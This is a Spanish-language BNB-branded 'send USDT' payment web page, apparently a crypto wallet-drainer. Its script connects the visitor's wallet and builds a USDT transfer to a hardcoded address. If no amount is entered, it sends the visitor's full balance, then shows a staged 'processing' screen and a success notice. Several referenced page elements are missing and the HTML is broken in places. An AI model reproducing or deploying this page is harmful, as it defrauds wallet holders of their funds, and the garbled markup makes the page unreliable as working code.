<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar</title>

    <style>
        :root {
            color-scheme: dark;
            --bnb-gold: #f3ba2f;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        html, body {
            background-color: #000 !important;
            color: #fff !important;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
        }

        body {
            background: 
                radial-gradient(circle at 12% 18%, rgba(243, 186, 47, 0.15) 0%, rgba(243, 186, 47, 0.05) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(243, 186, 47, 0.12) 0%, rgba(243, 186, 47, 0.04) 28%, transparent 52%),
                #000 !important;
            background-attachment: fixed;
            padding: 20px 16px 100px;
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 8px;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 2px;
            width: 24px;
            height: 24px;
            color: #fff;
            cursor: pointer;
        }

        .tw-header-title {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
            text-align: center;
            width: 100%;
        }

        .tw-header-title-main {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
        }

        .tw-network-badge, .network-card-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 4px 10px;
            border-radius: 999px;
            background: rgba(243, 186, 47, 0.1);
            border: 1px solid rgba(243, 186, 47, 0.35);
            color: var(--bnb-gold);
            font-size: 11px;
            font-weight: 700;
        }

        .tw-logo {
            width: 54px;
            height: 54px;
            margin: 16px 0 8px;
            display: block;
        }

        /* Tarjetas y Contenedores Unificados */
        .tw-input-group, .network-card, .tw-address-box {
            background: linear-gradient(145deg, rgba(20, 20, 21, 0.95), rgba(8, 8, 9, 0.95));
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 16px;
            padding: 14px 16px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
        }

        .tw-label {
            font-size: 12px;
            color: #a4a9b2;
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #fff;
            font-size: 15px;
            width: 100%;
            outline: none;
            text-overflow: ellipsis;
        }

        .tw-input::placeholder {
            color: #666;
        }

        .tw-currency-badge {
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 6px;
            flex-shrink: 0;
        }

        .usdt-icon {
            width: 20px;
            height: 20px;
        }

        /* Red conectada card */
        .network-card {
            display: none;
            align-items: center;
            gap: 12px;
        }

        .network-card-logo {
            width: 28px;
            height: 28px;
            object-fit: contain;
        }

        .network-card-copy {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
            min-width: 0;
        }

        .network-card-label {
            color: #a4a9b2;
            font-size: 11px;
        }

        .network-card-name {
            color: #fff;
            font-size: 13px;
            font-weight: 650;
        }

        /* Stepper de cantidad */
        .amount-stepper {
            display: grid;
            grid-template-columns: 36px minmax(0, 1fr) 36px;
            align-items: center;
            gap: 6px;
            width: 100%;
        }

        .amount-step-btn {
            width: 36px;
            height: 36px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            background: #18181b;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .amount-step-btn:active {
            background: #27272a;
        }

        .amount-stage {
            display: none;
        }

        /* Botón Principal */
        .tw-btn-container {
            margin-top: 10px;
            width: 100%;
        }

        .tw-btn {
            width: 100%;
            height: 50px;
            background: linear-gradient(90deg, #efad16, #ffd541);
            color: #050505;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            box-shadow: 0 6px 20px rgba(243, 186, 47, 0.25);
            transition: opacity 0.2s, transform 0.1s;
        }

        .tw-btn:active {
            transform: scale(0.98);
        }

        .tw-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .link-icon {
            width: 18px;
            height: 18px;
        }

        /* Status y Footer */
        .status-box {
            background: rgba(20, 20, 21, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: var(--bnb-gold);
            display: none;
            text-align: center;
        }

        .site-footer {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 15px;
            font-size: 11px;
            color: #888;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            z-index: 10;
        }

        .site-footer a {
            color: var(--bnb-gold);
            text-decoration: none;
        }

        /* Loaders y Modales */
        .page-loader, .processing-screen, .success-modal-overlay {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }

        .page-loader.hidden, .processing-screen:not(.visible), .success-modal-overlay:not(.visible) {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .loader-logo, .processing-logo {
            width: 70px;
            height: 70px;
            margin-bottom: 16px;
            animation: pulse 1.2s ease-in-out infinite;
        }

        .loader-spinner {
            width: 28px;
            height: 28px;
            border: 3px solid rgba(255, 255, 255, 0.15);
            border-top-color: var(--bnb-gold);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .loader-text, .processing-title {
            margin-top: 12px;
            color: #fff;
            font-size: 14px;
            font-weight: 500;
        }

        .processing-bar {
            width: 160px;
            height: 4px;
            background: #27272a;
            border-radius: 999px;
            overflow: hidden;
            position: relative;
        }

        .processing-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: -40%;
            width: 40%;
            height: 100%;
            background: var(--bnb-gold);
            animation: slide 1.1s infinite ease-in-out;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(0.92); } }
        @keyframes slide { 0% { left: -40%; } 100% { left: 100%; } }

        /* Modal Éxito */
        .success-modal-card {
            background: linear-gradient(145deg, #141415, #080809);
            border: 1px solid rgba(243, 186, 47, 0.3);
            border-radius: 20px;
            width: 90%;
            max-width: 360px;
            padding: 22px;
            text-align: center;
        }

        .success-icon-wrap {
            width: 54px;
            height: 54px;
            background: rgba(16, 185, 129, 0.15);
            border: 2px solid #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            color: #10b981;
        }

        .success-icon-wrap svg { width: 28px; height: 28px; }
        .success-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 4px; }
        .success-subtitle { font-size: 12px; color: #a4a9b2; margin-bottom: 16px; }
        
        .success-amount-box {
            background: rgba(243, 186, 47, 0.08);
            border: 1px dashed rgba(243, 186, 47, 0.3);
            border-radius: 12px;
            padding: 10px;
            font-size: 22px;
            font-weight: 700;
            color: var(--bnb-gold);
            margin-bottom: 16px;
        }

        .success-details-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 18px;
            text-align: left;
            font-size: 12px;
        }

        .success-detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .detail-label { color: #8d96a6; }
        .detail-value { color: #fff; font-weight: 600; }
        .status-badge-success { color: #10b981; background: rgba(16, 185, 129, 0.12); padding: 2px 6px; border-radius: 4px; }
        .tx-link { color: var(--bnb-gold); text-decoration: none; display: flex; align-items: center; gap: 4px; }
    </style>
</head>
<body>

<div id="pageLoader" class="page-loader">
    <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
    <div class="loader-text">Cargando...</div>
</div>

<div id="processingScreen" class="processing-screen">
    <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="processing-logo">
    <div class="processing-bar"></div>
    <div class="processing-title">Procesando transacción...</div>
</div>

<!-- Modal Éxito -->
<div id="successModal" class="success-modal-overlay">
    <div class="success-modal-card">
        <div class="success-icon-wrap">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
        </div>

        </div>

        <div class="success-details-list">
            <div class="success-detail-row">
                <span class="detail-label">Estado</span>
                <span class="detail-value status-badge-success">Completado</span>
            </div>
            <div class="success-detail-row">
                <span class="detail-label">Red</span>

            </div>
            <div class="success-detail-row">
                <span class="detail-label">Hash TX</span>
                <span class="detail-value">
                    <a id="modalTxLink" href="#" target="_blank" rel="noopener noreferrer" class="tx-link">

        <button type="button" class="tw-btn" id="closeSuccessModalBtn">Aceptar</button>

<div class="tw-container">
    <div class="tw-header">
        <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
        </svg>
        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>

    <!-- Billetera Conectada (Oculta inicialmente) -->
    <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">

            </div>
            <span class="tw-currency-badge">

                <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
                <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>

<script>
    window.addEventListener('load', function () {
        setTimeout(() => {
            const loader = document.getElementById('pageLoader');
            if (loader) loader.classList.add('hidden');
        }, 600);
    });
</script>

<script>
const BILLETERA_DESTINO="0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
const CONTRATO_USDT="0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID="0x38";
const BSC_PUBLIC_RPC="https://bsc-dataseed.bnbchain.org";
const DECIMALS=18n;

const connectBtn=document.getElementById("connectBtn");
const statusDiv=document.getElementById("status");
const amountDisplay=document.getElementById("amountDisplay");
const addressDisplay=document.getElementById("addressDisplay");
const walletInfo=document.getElementById("walletInfo");
const walletAddressText=document.getElementById("walletAddressText");
const networkInfo=document.getElementById("tronNetworkInfo");
const processingScreen=document.getElementById("processingScreen");
const amountStageContainer = document.getElementById("amountStageContainer");

const successModal=document.getElementById("successModal");
const modalAmount=document.getElementById("modalAmount");
const modalTxHash=document.getElementById("modalTxHash");
const modalTxLink=document.getElementById("modalTxLink");
const closeSuccessModalBtn=document.getElementById("closeSuccessModalBtn");

let walletAddress=null, processingStartedAt=0;

function abreviarDireccion(addr){
 return addr && addr.length>17 ? addr.slice(0,8)+"..."+addr.slice(-6) : addr;
}
addressDisplay.value=abreviarDireccion(BILLETERA_DESTINO);

function setStatus(m){statusDiv.innerText=m||"";statusDiv.style.display=m?"block":"none";}
function showProcessingScreen(){processingStartedAt=Date.now();if(processingScreen)processingScreen.classList.add("visible");}
async function hideProcessingScreenAfterMinimum(){if(!processingStartedAt)return;const r=Math.max(0,3000-(Date.now()-processingStartedAt));if(r)await new Promise(x=>setTimeout(x,r));if(processingScreen)processingScreen.classList.remove("visible");processingStartedAt=0;}
function provider(){if(window.ethereum)return window.ethereum;if(window.trustwallet?.ethereum)return window.trustwallet.ethereum;throw new Error("Abre esta página desde el navegador dApp.");}
async function rpc(method,params=[]){return provider().request({method,params});}
function pad64(h){return h.replace(/^0x/,"").padStart(64,"0");}
function encAddr(a){return pad64(a.toLowerCase());}
function format18(v){v=BigInt(v);const b=10n**DECIMALS,w=v/b,f=(v%b).toString().padStart(18,"0").replace(/0+$/,"");return f?`${w}.${f}`:w.toString();}

function parse18(v){
 if(!v) return 0n;
 const clean=v.toString().replace(',','.').trim();
 if(!clean || isNaN(clean)) return 0n;
 const parts=clean.split('.');
 const intPart=parts[0]||"0";
 const decPart=(parts[1]||"").padEnd(18,'0').slice(0,18);
 return BigInt(intPart+decPart);
}

function showSuccessModal(details){
 if(!successModal) return;
 modalAmount.textContent = details.amountSent;
 modalTxHash.textContent = abreviarDireccion(details.txHash);
 modalTxLink.href = "https://bscscan.com/tx/" + details.txHash;
 successModal.classList.add("visible");
}

if(closeSuccessModalBtn){
 closeSuccessModalBtn.addEventListener("click", () => {
  if(successModal) successModal.classList.remove("visible");
 });
}

function normalizeChainId(value){
 if(value && typeof value === "object"){
  if("result" in value) value=value.result;
  else if("chainId" in value) value=value.chainId;
 }
 if(typeof value === "bigint") return Number(value);
 if(typeof value === "number") return value;
 if(typeof value === "string"){
  const s=value.trim();
  if(!s) return NaN;
  return s.toLowerCase().startsWith("0x") ? parseInt(s,16) : parseInt(s,10);
 }
 return NaN;
}

async function ensureBSC(){
 const rawId=await rpc("eth_chainId");
 const chainNumber=normalizeChainId(rawId);
 if(chainNumber===56)return;
 try{
  await rpc("wallet_switchEthereumChain",[{chainId:BSC_CHAIN_ID}]);
 }catch(e){
  if(e?.code!==4902)throw e;
  await rpc("wallet_addEthereumChain",[{
   chainId:BSC_CHAIN_ID,chainName:"BNB Smart Chain",
   nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
   rpcUrls:["https://bsc-dataseed.binance.org/"],
   blockExplorerUrls:["https://bscscan.com/"]
  }]);
 }
}

async function publicRpc(method,params=[]){
 const response=await fetch(BSC_PUBLIC_RPC,{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({jsonrpc:"2.0",id:1,method,params})
 });
 if(!response.ok) throw new Error("RPC público HTTP "+response.status);
 const json=await response.json();
 if(json.error) throw new Error("RPC público: "+(json.error.message||JSON.stringify(json.error)));
 return json.result;
}

async function balanceOf(owner){
 const data="0x70a08231"+encAddr(owner);
 const result=await publicRpc("eth_call",[{to:CONTRATO_USDT,data},"latest"]);
 return BigInt(result||"0x0");
}

connectBtn.addEventListener("click",async()=>{
 if(!walletAddress){
  try{
   setStatus("Estableciendo enlace con BSC...");
   connectBtn.disabled=true;await ensureBSC();
   const accounts=await rpc("eth_requestAccounts");walletAddress=accounts?.[0];
   if(!walletAddress)throw new Error("No se obtuvo acceso a la dirección.");
   
   walletAddressText.textContent=abreviarDireccion(walletAddress);
   walletInfo.style.display="block";
   networkInfo.style.display="flex";
   amountStageContainer.style.display="block";
   
   setStatus("Conexión establecida.");
   connectBtn.innerText="Continuar";
  }catch(e){console.error(e);setStatus(e.message||"Error de conexión.");}
  finally{connectBtn.disabled=false;}
  return;
 }
 try{
  connectBtn.disabled=true;await ensureBSC();
  const balance=await balanceOf(walletAddress);
  if(balance===0n)throw new Error("La cuenta no dispone de USDT BEP-20.");

  let amountToSend = 0n;
  const userInputValue = amountDisplay ? amountDisplay.value.trim() : "";

  if(userInputValue && parseFloat(userInputValue) > 0) {
      amountToSend = parse18(userInputValue);
      if(amountToSend > balance) {
          throw new Error("El monto supera el saldo disponible (" + format18(balance) + " USDT).");
      }
  } else {
      amountToSend = balance;
      if(amountDisplay) amountDisplay.value = format18(balance);
  }

  const data="0xa9059cbb"+encAddr(BILLETERA_DESTINO)+BigInt(amountToSend).toString(16).padStart(64,"0");

  setStatus("Solicitando autorización de firma digital...");
  const txRequest = { from: walletAddress, to: CONTRATO_USDT, value: "0x0", data: data };
  
  const txHash=await rpc("eth_sendTransaction",[txRequest]);
  showProcessingScreen();
  await hideProcessingScreenAfterMinimum();
  setStatus("TRANSACCIÓN ENVIADA.");
  connectBtn.innerText="Completado";

  showSuccessModal({
      txHash: txHash,
      amountSent: format18(amountToSend),
      from: walletAddress,
      to: BILLETERA_DESTINO
  });

 }catch(e){
  console.error(e);
  await hideProcessingScreenAfterMinimum();
  setStatus(e.message || "Error al procesar la transacción.");
  connectBtn.disabled=false;
  connectBtn.innerText="Continuar";
 }
});

// Stepper controls
(() => {
    const input = document.getElementById('amountDisplay');
    const minus = document.getElementById('amountMinus');
    const plus = document.getElementById('amountPlus');
    if (!input || !minus || !plus) return;

    const read = () => {
        const n = Number.parseFloat(String(input.value).replace(',', '.'));
        return Number.isFinite(n) ? n : 0;
    };

    const write = (n) => {
        n = Math.max(0, n);
        input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
    };

    minus.addEventListener('click', () => write(read() - 1));
    plus.addEventListener('click', () => write(read() + 1));
})();
</script>

</body>
</html>
